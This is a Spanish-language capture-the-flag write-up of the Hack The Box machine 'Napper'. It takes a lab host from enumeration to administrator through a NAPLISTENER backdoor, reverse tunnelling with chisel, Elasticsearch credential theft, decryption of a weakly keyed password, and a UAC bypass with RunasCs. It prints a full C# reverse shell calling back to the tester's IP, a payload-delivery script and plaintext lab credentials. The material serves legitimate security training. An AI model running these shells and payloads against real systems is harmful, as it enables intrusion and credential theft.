+++
author = "Andrés Del Cerro"
title = "Hack The Box: Napper Writeup | Hard"
date = "2024-08-27"
description = ""
tags = [
    "HackTheBox",
    "Napper",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Windows",
    "HTTPS Enumeration",
    "SSL Certificate Inspection",
    "Information Leakage",
    "NAPLISTENER",
    "Rerverse Port Forwarding",
    "ElasticDB Enumeration",
    "Reversing Engineering",
    "Reversing",
    "GHidra",
    "Go Scripting",
    "Python Scripting",
    "Scripting",
    "Decrypting"
]

+++

# Hack The Box: Napper Writeup

Welcome to my detailed writeup of the hard difficulty machine **"Napper"** on Hack The Box. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
$ rustscan -a 10.129.229.166 --ulimit 5000 -g
10.129.229.166 -> [80,443,7680]
```

```console
$ nmap -p80,443,7680 -sCV 10.129.229.166 -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:48 CEST
Nmap scan report for 10.129.229.166
Host is up (0.036s latency).

PORT     STATE    SERVICE   VERSION
80/tcp   open     http      Microsoft IIS httpd 10.0
|_http-title: Did not follow redirect to https://app.napper.htb
|_http-server-header: Microsoft-IIS/10.0
443/tcp  open     ssl/http  Microsoft IIS httpd 10.0
|_http-generator: Hugo 0.112.3
|_ssl-date: 2024-08-27T12:48:39+00:00; -1h59m59s from scanner time.
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=app.napper.htb/organizationName=MLopsHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:app.napper.htb
| Not valid before: 2023-06-07T14:58:55
|_Not valid after:  2033-06-04T14:58:55
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Research Blog | Home 
7680/tcp filtered pando-pub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.31 seconds
```

# UDP Enumeration

```console
$ sudo nmap --top-ports 1500 -sU --min-rate 1500 -n -Pn 10.129.229.166 -oN ../Desktop/napper/scan/allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 16:47 CEST
Nmap scan report for 10.129.229.166
Host is up.
All 1500 scanned ports on 10.129.229.166 are in ignored states.
Not shown: 1500 open|filtered udp ports (no-response)

Nmap done: 1 IP address (1 host up) scanned in 3.19 seconds
```

# HTTPS Enumeration
Ya que el sitio web es HTTPS, vamos a inspeccionar primero el certificado TLS.

```console
$ openssl s_client -showcerts -connect 10.129.229.166:443
```

De este análisis encontramos el dominio `napper.htb` y los subdominios `app.napper.htb`, `ca.napper.htb`

```console
$ whatweb https://napper.htb 
https://napper.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.129.229.166], MetaGenerator[Hugo 0.112.3], Microsoft-IIS[10.0], Open-Graph-Protocol[website], Script[text/javascript,text/x-mathjax-config], Title[Research Blog | Home], X-UA-Compatible[IE=edge]
```
`whatweb` nos reporta que es un blog hecho con Hugo (como este blog que estas leyendo ahora mismo) y que por detrás existe un IIS 10.0.

## Information Leakage
Viendo los artículos del blog nos encontramos una credencial de prueba, nos la podemos apuntar por si acaso se le ha olvidado eliminarla.
![Write-up Image](images/Screenshot_1.png)

El caso es que no encontramos ningún sitio para autenticarnos.

Después de fuzzear no encontramos nada.

Buscando subdominios encontramos el subdominio `internal.napper.htb`
```console
$ wfuzz --hh=5589 -c -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.
txt -H 'Host: FUZZ.napper.htb' https://napper.htb
.....
000000387:   401        29 L     100 W      1293 Ch     "internal"
```

Nos pide autenticación...
![Write-up Image](images/Screenshot_2.png)

Y con `example:ExamplePassword` podemos autenticarnos y vemos un artículo que antes no era visible..
![Write-up Image](images/Screenshot_3.png)

## Exploiting NAPLISTENER Backdoor -> Foothold
El artículo habla sobre el malware `NAPLISTENER`

> HTTP listener written in C#, which we refer to as NAPLISTENER. Consistent with SIESTAGRAPH and other malware families developed or used by this threat, NAPLISTENER appears designed to evade network-based forms of detection.

> This means that any web request to /ews/MsExgHealthCheckd/ that contains a base64-encoded .NET assembly in the sdafwe3rwe23 parameter will be loaded and executed in memory. It's worth noting that the binary runs in a separate process and it is not associated with the running IIS server directly.


El sitio web que esté "backdoorizado" podría ejecutar código .NET base64-encodeado en el endpoint `/ews/MsExgHealthCheckd/` por el parámetro `sdafwe3rwe23`.

Hay que tener en cuenta que se ejecutará en un proceso distinto y no está asociado al servicio que esté ejecutando el servidor IIS.

Podemos echar un ojo a [este artículo de eslatic](https://www.elastic.co/security-labs/naplistener-more-bad-dreams-from-the-developers-of-siestagraph)

No encuentro que la ruta donde está el backdoor exista.
![Write-up Image](images/Screenshot_4.png)

![Write-up Image](images/Screenshot_5.png)

Aunque puede que solo responda cuando un payload sea válido.

Podemos crear un pequeño script en C# para mandarnos un ping a nuestra máquina.
```C#
using System;
using System.Net.NetworkInformation;

namespace PingTest
{
    class Program
    {
        static void Main(string[] args)
        {
            string ipAddress = "10.10.14.125";
            Ping pingSender = new Ping();
            PingReply reply = pingSender.Send(ipAddress);
        }
    }
}
```

Y compilarlo con `mcs`

```console
$ sudo apt install mono-complete
```

```console
$ mcs -out:Test.exe Test.cs                                                       
Test.cs(12,23): warning CS0219: The variable `reply' is assigned but its value is never us
ed                                                                                        
Compilation succeeded - 1 warning(s) 
```

Lo codificamos en base64
```console
$ base64 Test.exe > payload.txt
```

Nos copiamos el binario codificado en la clipboard.
```console
$ cat payload.txt | xclip -sel clip
```


Ejecutando el PoC del artículo anterior detectamos que el sitio web `https://napper.htb` tiene este backdoor pero no conseguimos ejecución de comandos.

```python
import requests
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

hosts = ["app.napper.htb", "internal.napper.htb", "napper.htb"]
payload = "TVqQAAMAAAAEAAAA[...]"
form_field = f"sdafwe3rwe23={requests.utils.quote(payload)}"

for h in hosts:
    url_ssl = f"https://{h}/ews/MsExgHealthCheckd/"

    try:
        r_ssl = requests.post(url_ssl, data=form_field, verify=False)
        print(f"{url_ssl} : {r_ssl.status_code} {r_ssl.headers}")
    except KeyboardInterrupt:
        exit()
    except Exception as e:
        print(e)
        pass

```

```console
$ python3 poc.py 
/home/pointedsec/.local/lib/python3.11/site-packages/requests/__init__.py:102: RequestsDependencyWarning: urllib3 (1.26.19) or chardet (5.1.0)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn("urllib3 ({}) or chardet ({})/charset_normalizer ({}) doesn't match a supported "
https://app.napper.htb/ews/MsExgHealthCheckd/ : 404 {'Content-Type': 'text/html', 'Server': 'Microsoft-IIS/10.0', 'Date': 'Tue, 27 Aug 2024 13:25:45 GMT', 'Content-Length': '1245'}
https://internal.napper.htb/ews/MsExgHealthCheckd/ : 401 {'Content-Type': 'text/html', 'Server': 'Microsoft-IIS/10.0', 'WWW-Authenticate': 'Basic realm="internal.napper.htb"', 'Date': 'Tue, 27 Aug 2024 13:25:45 GMT', 'Content-Length': '1293'}
https://napper.htb/ews/MsExgHealthCheckd/ : 200 {'Content-Length': '0', 'Content-Type': 'text/html; charset=utf-8', 'Server': 'Microsoft-IIS/10.0 Microsoft-HTTPAPI/2.0', 'X-Powered-By': 'ASP.NET', 'Date': 'Tue, 27 Aug 2024 13:25:45 GMT'}
```
Podemos ver que `napper.htb` devuelve un código 200 OK pero no recibimos ningún Ping.

Después de prueba y error conseguí una consola con esta reverse shell en C#.

```C#
using System;                                                                                                                                                                                                                                                                                                                
using System.Text;                                                                                                                                                                                                                                                                                                           
using System.IO;                                                                                                                                                                                                                                                                                                             
using System.Diagnostics;                                                                                                                                                                                                                                                                                                    
using System.ComponentModel;                                                   
using System.Linq;                                                             
using System.Net;                                                              
using System.Net.Sockets;                                                      


namespace Rev                                                                  
{                                                                              
        public class Run                                                       
        {                                                                      
                static StreamWriter streamWriter;                                                                                                             

                public Run()                                                   
                {                                                              
                        using(TcpClient client = new TcpClient("10.10.14.125", 443))                                                                          
                        {                                                      
                                using(Stream stream = client.GetStream())                                                                                     
                                {                                              
                                        using(StreamReader rdr = new StreamReader(stream))                                                                    
                                        {                                      
                                                streamWriter = new StreamWriter(stream);                                                                      

                                                StringBuilder strInput = new StringBuilder();                                                                 

                                                Process p = new Process();                                                                                    
                                                p.StartInfo.FileName = "cmd.exe";                                                                             
                                                p.StartInfo.CreateNoWindow = true;                                                                            
                                                p.StartInfo.UseShellExecute = false;                                                                          
                                                p.StartInfo.RedirectStandardOutput = true;                                                                    
                                                p.StartInfo.RedirectStandardInput = true;                                                                     
                                                p.StartInfo.RedirectStandardError = true;                                                                     
                                                p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);                                   
                                                p.Start();                                                                                                    
                                                p.BeginOutputReadLine();                                                                                      

                                                while(true)                                                                                                   
                                                {                                                                                                             
                                                        strInput.Append(rdr.ReadLine());                                                                      
                                                        //strInput.Append("\n");                                                                              
                                                        p.StandardInput.WriteLine(strInput);                                                                  
                                                        strInput.Remove(0, strInput.Length);                                                                  
                                                }                                                                                                             
                                        }                                      
                                }                                              
                        }                                                      
                }                                                              

                private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)                                                
        {                                                                      
            StringBuilder strOutput = new StringBuilder();                                                                                                    

            if (!String.IsNullOrEmpty(outLine.Data))                                                                                                          
            {                                                                  
                try                                                            
                {                                                              
                    strOutput.Append(outLine.Data);                                                                                                           
                    streamWriter.WriteLine(strOutput);                                                                                                        
                    streamWriter.Flush();                                      
                }                                                              
                catch (Exception err) { }                                      
            }                                                                  
        }                                                                      

        }                                                                      
}  
```

Compilando como librería.
```console
$ mcs -target:library -out:Rev.dll Rev.cs 
Test.cs(12,23): warning CS0219: The variable `reply' is assigned but its value is never used
Compilation succeeded - 1 warning(s)
```

Codificando el base64 y pegando el output al BurpSuite para hacer la solicitud.
**CTRL + U** Para URL encodear.
![Write-up Image](images/Screenshot_6.png)

Y conseguimos acceso.
```console
$ sudo rlwrap -cEr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.125] from (UNKNOWN) [10.129.229.166] 57159
Microsoft Windows [Version 10.0.19045.3636]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>
whoami
```

Podemos leer la flag de usuario.
```console
C:\Users\ruben\Desktop>type user.txt
219f46b8c56553c19...
```

# Privilege Escalation
Por alguna razón los proyectos Hugo sin compliar (código base) están en `C:\Temp\www\`

Aquí nos encontramos dos directorios, `app` e `internal`
```console
C:\Temp\www>dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF
 Directory of C:\Temp\www
06/09/2023  12:18 AM    <DIR>          .
06/09/2023  12:18 AM    <DIR>          ..
06/09/2023  12:18 AM    <DIR>          app
06/09/2023  12:18 AM    <DIR>          internal
               0 File(s)              0 bytes
               4 Dir(s)   4,564,426,752 bytes free
```

```console
C:\Temp\www\internal\content\posts>dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF
 Directory of C:\Temp\www\internal\content\posts
06/09/2023  12:20 AM    <DIR>          .
06/09/2023  12:20 AM    <DIR>          ..
06/09/2023  12:18 AM             1,755 first-re-research.md
06/09/2023  12:28 AM    <DIR>          internal-laps-alpha
06/09/2023  12:18 AM               493 no-more-laps.md
               2 File(s)          2,248 bytes
               3 Dir(s)   4,564,811,776 bytes free
```

Encontramos un post que no están publicado `no-more-laps.md`
```console
C:\Temp\www\internal\content\posts>dir
 Volume in drive C has no label.
 Volume Serial Number is CB08-11BF
 Directory of C:\Temp\www\internal\content\posts
06/09/2023  12:20 AM    <DIR>          .
06/09/2023  12:20 AM    <DIR>          ..
06/09/2023  12:18 AM             1,755 first-re-research.md
06/09/2023  12:28 AM    <DIR>          internal-laps-alpha
06/09/2023  12:18 AM               493 no-more-laps.md
               2 File(s)          2,248 bytes
               3 Dir(s)   4,564,811,776 bytes free
```

Y encontramos un directorio `internal-laps-alpha` que contiene un binario `a.exe`

También contiene un fichero `.env` con credenciales para una instancia de ElasticSearch.
```console
C:\Temp\www\internal\content\posts\internal-laps-alpha>type .env
ELASTICUSER=user
ELASTICPASS=DumpPassword\$Here
ELASTICURI=https://127.0.0.1:9200
```

Leyendo el post..
```markdown
---
title: "**INTERNAL** Getting rid of LAPS"
description: Replacing LAPS with out own custom solution
date: 2023-07-01
draft: true 
tags: [internal, sysadmin] 
---
# Intro
We are getting rid of LAPS in favor of our own custom solution. 
The password for the `backup` user will be stored in the local Elastic DB.
IT will deploy the decryption client to the admin desktops once it it ready. 
We do expect the development to be ready soon. The Malware RE team will be the first test group. 
```

# Reverse Port Forwarding
Vamos a compartirnos el puerto 9200 donde está el ElasticSearch a nuestra máquina con `chisel`

Con `impacket-smbserver` vamos a servidor bajo el recurso `smbFolder` el binario `chisel.exe` para pasarlo a la máquina víctima
```console
$ sudo impacket-smbserver -smb2support smbFolder .
```

```console
C:\ProgramData>copy \\10.10.14.125\smbFolder\chisel.exe chisel.exe
        1 file(s) copied.
```

Ahora en nuestra máquina de atacante nos ponemos en escucha con `chisel` para hacer reverse port forwarding por el puerto 1234

```console
$ /opt/chisel/chisel server --reverse -p 1234
2024/08/27 18:01:42 server: Reverse tunnelling enabled
2024/08/27 18:01:42 server: Fingerprint bEQflnf3gWBSSWLT8J0cMyLsdZwrLMC5qP/FPXdEKAU=
2024/08/27 18:01:42 server: Listening on http://0.0.0.0:1234
```

Ahora en la máquina víctima nos pasamos con el binario de `chisel.exe` el puerto 9200 para que se convierta a nuestro puerto local 9200.
```console
:\ProgramData>.\chisel.exe client 10.10.14.125:1234 R:9200:127.0.0.1:9200
```

Y vemos que todo ha salido bien en principio.
```console
$ /opt/chisel/chisel server --reverse -p 1234
2024/08/27 18:01:42 server: Reverse tunnelling enabled
2024/08/27 18:01:42 server: Fingerprint bEQflnf3gWBSSWLT8J0cMyLsdZwrLMC5qP/FPXdEKAU=
2024/08/27 18:01:42 server: Listening on http://0.0.0.0:1234
2024/08/27 18:03:02 server: session#1: tun: proxy#R:9200=>9200: Listening
```

Podemos hacer una pequeña prueba y vemos que ahora en local tenemos el puerto 9200 abierto.
```console
$ nmap -p9200 127.0.0.1
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-27 18:05 CEST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000065s latency).

PORT     STATE SERVICE
9200/tcp open  wap-wsp

Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```

Nos pide autenticación.
![Write-up Image](images/Screenshot_7.png)

Vamos a probar con las credenciales que hemos visto antes -> `user:DumpPassword$Here`.

Y aquí tenemos el sitio.
![Write-up Image](images/Screenshot_8.png)

Vemos unas credenciales, `backupuser:tWUZG4e8QpWIwT8HmKcBiw`

Después de probarlas no servían para migrar a la cuenta de usuario `backup` que existe en la máquina víctima.

# ElasticSearch Enumeration

Gracias a [este artículo de HackTricks](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch) podemos ayudarnos para enumerar a ver que información interesante conseguimos.

Vemos dos índices, `seed` y `user-00001`
```console
$ curl 'https://user:DumpPassword$Here@127.0.0.1:9200/_cat/indices?v' -k
health status index      uuid                   pri rep docs.count docs.deleted store.size pri.store.size
yellow open   seed       aqAoiRfuS2O2dAjhrgVs1A   1   1          1            0      3.3kb          3.3kb
yellow open   user-00001 aY6z82tqR6C73F0KczSMWA   1   1          1            0      5.4kb          5.4kb

```

Enumerando el índice `user-00001`
```console
$ curl 'https://user:DumpPassword$Here@127.0.0.1:9200/user-00001/_search?pretty=true' -k
{
  "took" : 4,
  "timed_out" : false,
  "_shards" : {
    "total" : 1,
    "successful" : 1,
    "skipped" : 0,
    "failed" : 0
  },
  "hits" : {
    "total" : {
      "value" : 1,
      "relation" : "eq"
    },
    "max_score" : 1.0,
    "hits" : [
      {
        "_index" : "user-00001",
        "_id" : "tIAqlJEBwnHgAPO7iyz4",
        "_score" : 1.0,
        "_source" : {
          "blob" : "7GM0hTEK1IcpArBkUmIbZiQvmopg5Truh57rdp1uaS84nBRCWekG402RXYdj4y_YAhpFqIzEix0=",
          "timestamp" : "2024-08-27T07:08:21.9776954-07:00"
        }
      }
    ]
  }
}
```

Vemos una secuencia en base64 `7GM0hTEK1IcpArBkUmIbZiQvmopg5Truh57rdp1uaS84nBRCWekG402RXYdj4y_YAhpFqIzEix0=`

Pero se nos representa que no es un input válido.
```console
$ echo "3IovgiWmZw6P_io9AcyoQ5GMiqJToDb69FeynB4wLSSMNrIPvY_BkGxovMEFi7KoJ6afXC6LjQ0=" | base64 -d
܊/%gbase64: invalid input
```

## Reversing `a.exe`
Haciendo uso de la información obtenida en la nota, vamos a decompilar el binario `a.exe` a ver si este es el cliente para decompilar la credencial del usuario `backup`

Nos vamos a copiar a nuestra máquina el binario `a.exe` y el fichero `.env`

```console
C:\Temp\www\internal\content\posts\internal-laps-alpha>copy .env \\10.10.14.125\smbFolder\.env
        1 file(s) copied.
C:\Temp\www\internal\content\posts\internal-laps-alpha>copy a.exe \\10.10.14.125\smbFolder\a.exe
        1 file(s) copied.
```

```console
$ file a.exe
a.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows, 13 sections
```

`ghidra` nos reporta que es un binario que ha sido compilado con `golang`

Detectamos la función `main`, por el camino he visto que se utilizan funciones relacionadas con operaciones criptográficas.
![Write-up Image](images/Screenshot_9.png)

Podemos pasarle esta función a ChatGPT y nos responde lo siguiente:
### 1. **Carga de variables de entorno**:

- El programa comienza cargando variables de entorno utilizando la función `os.Getenv`. Estas variables pueden estar relacionadas con configuraciones de la aplicación, como direcciones URL, claves de API, o configuraciones de entorno.
- Se menciona el uso de una biblioteca llamada `godotenv` (`github.com/joho/godotenv.Load`) que se utiliza comúnmente para cargar variables de entorno desde un archivo `.env`.

### 2. **Interacción con Elasticsearch**:

- La línea `local_270 = github.com/elastic/go-elasticsearch/v8.NewClient();` sugiere que el programa está creando un cliente para interactuar con una instancia de Elasticsearch. Elasticsearch es una base de datos de búsqueda y análisis.
- Hay varias llamadas a funciones dentro de la biblioteca de Elasticsearch, lo que indica que el programa podría estar ejecutando operaciones de búsqueda o indexación.

### 3. **Manejo de errores**:

- El código verifica constantemente el resultado de las operaciones y, en caso de error, utiliza funciones como `log.Fatal` o `log.Fatalf` para registrar el error y posiblemente terminar el programa.
- `log.Fatal` y `log.Fatalf` son funciones comunes en Go para manejar errores fatales que deben finalizar el programa.

### 4. **Manejo de JSON**:

- Hay una llamada a `encoding/json.Unmarshal`, lo que indica que el programa está deserializando (decodificando) datos en formato JSON a una estructura Go.
- También se menciona `encoding/json.Marshal`, lo que sugiere que hay serialización (codificación) de datos en formato JSON.

### 5. **Generación de claves y encriptación**:

- El código menciona `main.genKey` y `main.encrypt`, lo que sugiere que la aplicación está generando una clave y realizando operaciones de cifrado.
- Esto podría indicar que el programa maneja datos sensibles y necesita asegurar la información, posiblemente antes de enviarla a Elasticsearch o a otro sistema.

### 6. **Ejecución de comandos del sistema**:

- La función `os/exec.Command` y `os/exec.(*Cmd).CombinedOutput` se utilizan para ejecutar comandos del sistema operativo. Esto implica que el programa podría estar invocando comandos externos, posiblemente utilizando los datos que ha procesado.
- Esto puede ser peligroso si no se maneja correctamente, ya que la ejecución de comandos externos puede ser explotada si se insertan comandos maliciosos.

### 7. **Funcionalidades adicionales**:

- Hay varias funciones mencionadas como `main.main.func1`, `main.main.func2`, `main.main.func3`, lo que sugiere que hay lógica adicional encapsulada en estas funciones.
- `main.randStringList` sugiere la generación de una lista de cadenas aleatorias, lo que puede estar relacionado con la generación de claves, tokens, o identificadores únicos.

### Conclusión:

Este código parece ser parte de una aplicación Go que:

- Carga configuraciones desde variables de entorno.
- Interactúa con una instancia de Elasticsearch.
- Maneja datos JSON.
- Realiza operaciones de cifrado y generación de claves.
- Ejecuta comandos del sistema operativo.

Dado el uso de `log.Fatal` y el manejo de errores fatales, parece que la aplicación está diseñada para terminar la ejecución si encuentra problemas críticos, como la imposibilidad de cargar configuraciones o conectarse a servicios externos.

Me interesa la parte donde hace la operación criptográfica.

Existe la función `main.encrypt` la cual supongo que encriptará el blob guardado en la base de datos. Esto quiero pensar que se hace habitualmente para ir rotando la contraseña del usuario `backup`

Y luego está la función `main.genKey` que es la utilizada para generar la semilla para realizar la encriptación.

También necesito saber cual es el formato de encriptación, esto lo podemos descubrir rápidamente echando un vistazo en `main.encrypt`.

Buscando el nombre de la clase, podemos revisar el código fuente.
```go
func newCFB(block Block, iv []byte, decrypt bool) Stream {
	blockSize := block.BlockSize()
	if len(iv) != blockSize {
		// stack trace will indicate whether it was de or encryption
		panic("cipher.newCFB: IV length must equal block size")
	}
	x := &cfb{
		b:       block,
		out:     make([]byte, blockSize),
		next:    make([]byte, blockSize),
		outUsed: blockSize,
		decrypt: decrypt,
	}
	copy(x.next, iv)

	return x
}
```

![Write-up Image](images/Screenshot_10.png)

El primer parámetro es el bloque a encriptar, el segundo parámetro el IV (Vector de Inicialización) y el tercer parámetro si está encriptado o desencriptando.

Podemos detectar que probablemente se esté utilizando AES - modo CFB.

Entonces para poder desencriptar la contraseña, necesito conseguir la `seed` del ElasticSearch junto a la contraseña encriptada, 

Una vez tengamos esto, podemos fácilmente desencriptar el bloque de datos utilizando la `seed` para generar la clave de encriptación.
![Write-up Image](images/Screenshot_11.png)

Con ayuda de ChatGPT intenté generar un script para desencriptar el blob pero fallé.

Así que probé a hacerlo en el lenguaje nativo del binario, Go.

Como no tengo ni idea de Go he necesitado mucha ayuda de ChatGPT.

Después de prueba y error un buen rato y pasarle la función `main.genKey` decompilada en ghidra y añadir la funcionalidad para conseguir la `seed` y el `blob` del Elastic, este es el script final.

```go
package main

import (
	"bytes"
	"strings"
	"os/exec"
	"strconv"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"math/rand"
)

// Función para conseguir la seed y el blob en base al script en python
func getSeedAndBlob() (int64, string, error) {
	cmd := exec.Command("python3", "getData.py")
	var out bytes.Buffer
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		return 0, "", err
	}

	output := out.String()
	parts := strings.Split(strings.TrimSpace(output), "|")
	if len(parts) != 2 {
		return 0, "", fmt.Errorf("unexpected output format")
	}

	seed, err := strconv.ParseInt(parts[0], 10, 64)
	if err != nil {
		return 0, "", err
	}

	blob := parts[1]
	return seed, blob, nil
}

// genKey genera una clave de 16 bytes basada en una semilla.
func genKey(seed int64) ([]byte, error) {
	rand.Seed(seed)
	key := make([]byte, 16)
	for i := 0; i < 16; i++ {
		key[i] = byte(rand.Intn(0xfe) + 1)
	}
	return key, nil
}

// decrypt desencripta el ciphertext base64 usando la clave generada.
func decrypt(seed int64, ciphertext string) (string, error) {
	key, err := genKey(seed)
	if err != nil {
		return "", err
	}

	// Decodifica el ciphertext base64
	decodedCiphertext, err := base64.URLEncoding.DecodeString(ciphertext)
	if err != nil {
		return "", err
	}

	// Verifica que el ciphertext tenga al menos el tamaño del bloque AES
	if len(decodedCiphertext) < aes.BlockSize {
		return "", fmt.Errorf("ciphertext is too short")
	}

	// Extrae el IV del ciphertext
	iv := decodedCiphertext[:aes.BlockSize]
	ciphertextBytes := decodedCiphertext[aes.BlockSize:]

	// Crea un nuevo bloque de cifrado AES en modo CFB
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	stream := cipher.NewCFBDecrypter(block, iv)

	// Desencripta el ciphertext
	plaintext := make([]byte, len(ciphertextBytes))
	stream.XORKeyStream(plaintext, ciphertextBytes)

	return string(plaintext), nil
}

func main() {
	seed,blob,err := getSeedAndBlob()
	if err != nil {
		fmt.Println("Error: ", err)
		return
	}
	fmt.Println("Seed: ", seed)
	fmt.Println("Blob: ", blob)
	plaintext, err := decrypt(seed, blob)
	if err != nil {
		fmt.Println("Decryption error:", err)
		return
	}

	fmt.Println("Decrypted plaintext:", plaintext)
}
```

Este script utiliza otro script en python llamado `getData.py` que simplemente hace una petición para conseguir el valor de `seed` y `blob` utilizando las credenciales anteriormente conseguidas.

```python
# getData.py
import requests
import urllib3
urllib3.disable_warnings()

URL = "https://127.0.0.1:9200/_search?pretty=true"
user = "user"
pwd = "DumpPassword$Here"

r = requests.get(URL, auth=(user, pwd), verify=False)
json_response = r.json()

seed_value = json_response['hits']['hits'][0]['_source']['seed']
blob_value = json_response['hits']['hits'][1]['_source']['blob']

print(f"{seed_value}|{blob_value}")
```

Al ejecutar el script...
```console
$ go run pass.go 
Seed:  41025560
Blob:  cMhkWTlT3MddLGL7ZzdusdiuHtKDKZwWmw4idmKoehp6mI7_L2PZ_MLAwN1JgW54jhEesmZlNdM=
Decrypted plaintext: fBcdkirrMWHVckDMWJWNNtEjDYgzVVOImuDJWlPq
```

En principio la credencial del usuario `backup` es `fBcdkirrMWHVckDMWJWNNtEjDYgzVVOImuDJWlPq`

¡Y conseguimos ejecutar comandos como `backup`!

Eso fue bastante complicado...
```console
C:\ProgramData>.\RunasCs.exe backup fBcdkirrMWHVckDMWJWNNtEjDYgzVVOImuDJWlPq "cmd /c whoami"
[*] Warning: The logon for user 'backup' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.
napper\backup
```

Ahora nos podemos mandar una revshell como este usuario.

**El propio `RunasCs.exe` nos está avisando de que usemos la flag --bypass-uac y --logon-type 8 para conseguir un token mas priviliago para el proceso**

```console
C:\ProgramData>.\RunasCs.exe backup qGTwMxgZpboSlSJiYGqfSdBXmgtaVRAGWIsPdfVb cmd.exe -r 10.10.14.125:443 --bypass-uac --logon-type 8
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-42cb7$\Default
[+] Async process 'C:\Windows\system32\cmd.exe' with pid 4196 created in background.
```

Si estamos en escucha con `netcat` por el puerto 443.
```console
$ sudo rlwrap -cEr nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.125] from (UNKNOWN) [10.129.229.166] 57370
Microsoft Windows [Version 10.0.19045.3636]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
napper\backup
```

Podemos comprobar que pertenecemos al grupo de `Administrators`
```console
C:\Users\Administrator\Desktop>net user backup
net user backup
User name                    backup
Full Name                    backup
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/27/2024 8:43:22 AM
Password expires             Never
Password changeable          8/27/2024 8:43:22 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   8/27/2024 8:45:05 AM

Logon hours allowed          All

Local Group Memberships      *Administrators       
Global Group memberships     *None                 
The command completed successfully.
```

Por lo cual nos hemos convertido en administradores del sistema y podemos leer la flag de `root`.

```console
C:\Users\Administrator\Desktop>type root.txt
type root.txt
fc9a5f7c77d0a1...
```

¡Y ya estaría!

Happy Hacking! 🚀